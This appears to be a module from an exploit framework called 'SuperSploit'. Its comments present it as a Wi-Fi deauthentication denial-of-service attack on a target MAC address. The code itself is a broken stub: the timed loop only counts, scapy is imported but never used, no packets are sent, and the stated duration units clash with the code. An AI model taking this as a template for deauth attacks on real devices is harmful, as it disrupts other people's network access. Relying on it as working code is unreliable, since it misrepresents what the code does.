# Author@DonaldFord
# integrated = True
#!#!#!
# This exploit's the way a device handles a deauth packet
# to create a targeted dos attack by repeatedly sending multiple
# deauth packets per second for a set amount of time
#
# REQUIRED OPTIONS
# R_HOST: Target mac address
# DURATION: Amount of seconds to run in ticks 1000 = 1/sec
#!#!#!

import os
import json
import time
import scapy

installation = f'{os.getenv("HOME")}/.SuperSploit'
with open(f"{installation}/.data/data.json", 'r') as file:
    di = json.load(file)
    file.close()

def attack():
    target = di["R_HOST"]
    timeNow = time.time
    timeEnd = timeNow() + float(int(di["DURATION"]))
    print(timeNow, timeEnd)
    n = 0
    print("sending deauth packets")
    while timeNow() < timeEnd:
        n += 1

    return

attack()